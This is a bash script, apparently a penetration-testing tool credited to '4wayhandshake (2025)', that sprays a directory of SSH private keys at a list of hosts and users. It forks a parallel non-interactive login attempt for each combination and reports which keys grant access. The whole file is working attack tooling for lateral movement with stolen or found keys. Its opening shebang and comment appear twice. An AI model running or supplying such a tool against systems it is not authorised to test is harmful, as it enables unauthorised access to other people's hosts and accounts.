#!/bin/bash

#
# Tries a set of SSH keys against a list of hosts and users
#

# Function to display usage information
#!/bin/bash

# Function to display usage information
usage() {
    echo "Usage: $0 <key_directory> <hosts_file> <users_file>"
    echo "  key_directory: Path to the directory containing SSH key files."
    echo "  hosts_file: Path to the file containing the list of hosts."
    echo "  users_file: Path to the file containing the list of users."
    echo "Options:"
    echo "  -h: Display this help message."
    exit 1
}

# Check for help option
if [[ "$1" == "-h" ]]; then
    usage
fi

# Check for the correct number of arguments
if [[ $# -ne 3 ]]; then
    usage
fi

cat << "EOF"
   __________ __        __ __        __         __ 
  / __/ __/ // / ____  / // /_ _____/ /_____ __/ / 
 _\ \_\ \/ _  / /___/ / _  / // / _  / __/ // / _ \
/___/___/_//_/       /_//_/\_, /\_,_/_/  \_,_/_//_/
                          /___/                    
                      
                      🤝🤝🤝🤝 4wayhandshake (2025)
                          
EOF

# Assign arguments to variables
key_directory="$1"
hosts_file="$2"
users_file="$3"

# Check if the key directory exists
if [[ ! -d "$key_directory" ]]; then
    echo "Error: Directory '$key_directory' does not exist."
    exit 1
else
    # Count files in the key directory
    file_count=$(find "$key_directory" -type f | wc -l)
    echo "Using key directory: ${key_directory} (${file_count} files)"
fi

# Check if the hosts file exists
if [[ ! -f "$hosts_file" ]]; then
    echo "Error: Hosts file '$hosts_file' does not exist."
    exit 1
else
    # Count lines in the hosts file
    hosts_line_count=$(wc -l < "$hosts_file")
    echo "Using hosts file: ${hosts_file} (${hosts_line_count} lines)"
fi

# Check if the users file exists
if [[ ! -f "$users_file" ]]; then
    echo "Error: Users file '$users_file' does not exist."
    exit 1
else
    # Count lines in the users file
    users_line_count=$(wc -l < "$users_file")
    echo "Using users file: ${users_file} (${users_line_count} lines)"
fi

# ANSI color codes
GREEN='\033[1;32m'  # Bold Green
BLUE='\033[0;34m'
RED='\033[1;31m'    # Bold red
YELLOW='\033[1;33m'
NC='\033[0m'

# Check connectivity to each host
echo -e "\n[!] ${YELLOW}Testing connectivity${NC} to each host..."
while IFS= read -r host; do
    # Skip comments and empty lines in hosts file
    [[ "$host" =~ ^#.* || -z "$host" ]] && continue
    if ! ping -c 1 -W 3 "$host" > /dev/null 2>&1; then
        echo -e "${RED}[-]${NC} Host ${RED}$host${NC} is ${RED}unreachable.${NC}"
    fi
done < "$hosts_file"

echo -e "\n[!] ${YELLOW}Spraying SSH keys${NC} at desired hosts and users..."
# Check SSH keys against each host/user combination
for keyfile in "$key_directory"/*; do
    chmod 600 "$keyfile"
    while IFS= read -r user; do
        # Skip comments and empty lines in users file
        [[ "$user" =~ ^#.* || -z "$user" ]] && continue
        while IFS= read -r host; do
            # Skip comments and empty lines in hosts file
            [[ "$host" =~ ^#.* || -z "$host" ]] && continue
            # Fork a separate process for each host you try this user on
            {
                # Run ssh in the background with a timeout (3s)
                if timeout 3 ssh -n -o BatchMode=yes -i "$keyfile" "$user"@"$host" exit > /dev/null 2>&1; then
                    echo -e "${GREEN}[+]${NC} Success: ${GREEN}$keyfile${NC} on ${GREEN}$host${NC} as ${GREEN}$user${NC}"
                else
                    echo -e "${BLUE}[-] Failed: $keyfile on $host as $user${NC}"
                fi
            } &
        done < "$hosts_file"
        # Merge all the processes forked for this user
        wait
    done < "$users_file"
done
